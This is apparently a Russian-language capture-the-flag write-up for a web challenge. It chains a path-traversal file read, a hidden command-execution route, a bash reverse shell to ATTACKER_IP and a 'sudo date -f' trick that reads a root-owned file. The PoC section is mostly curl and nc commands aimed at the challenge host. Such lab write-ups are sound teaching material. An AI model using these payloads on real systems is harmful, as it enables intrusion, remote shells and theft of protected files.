# Супер Тачки

**Категория:** Web — LFI → RCE → Privilege Escalation

## Кратко

Найден LFI в `/images/?img=...` — скачал `app.py`. В нём есть `/shellfordev/`, выполняющая `cmd` через `os.popen()` → RCE. Через неё подтвердил выполнение `ls`, поднял reverse shell и прочитал флаги. Второй флаг прочитал командой `sudo date -f /root/second_flaf`.

## Шаги (чуть подробнее, но коротко)

1. **Проверка `/images/`** — `GET /images/?img=img1.jpg` возвращает `./images/{img}`.
2. **LFI** — `GET /images/?img=./../app.py` → получили `app.py`.
3. **Анализ `app.py`** — есть маршрут `/shellfordev/` выполняющий `cmd` через `os.popen()`.
4. **Подтверждение RCE** — `GET /shellfordev/?cmd=ls`.
5. **Reverse shell** — на атакующем: `nc -lvnp 4444`; вызвать через `curl "http://host/shellfordev/?cmd=bash+-i+%3E%26+/dev/tcp/ATTACKER_IP/4444+0%3E%261"`.
6. **Чтение флагов** — `cat` обычных флагов; второй флаг: `sudo date -f /root/second_flaf`.

## PoC
```bash
curl "http://5.129.245.132:5535/images/?img=./../app.py" -o app.py
curl "http://5.129.245.132:5535/shellfordev/?cmd=ls"
# Reverse shell (замените ATTACKER_IP)
nc -lvnp 4444
curl "http://5.129.245.132:5535/shellfordev/?cmd=bash+-i+%3E%26+/dev/tcp/ATTACKER_IP/4444+0%3E%261"
# После получения shell
ls -la
sudo date -f /root/second_flaf
```
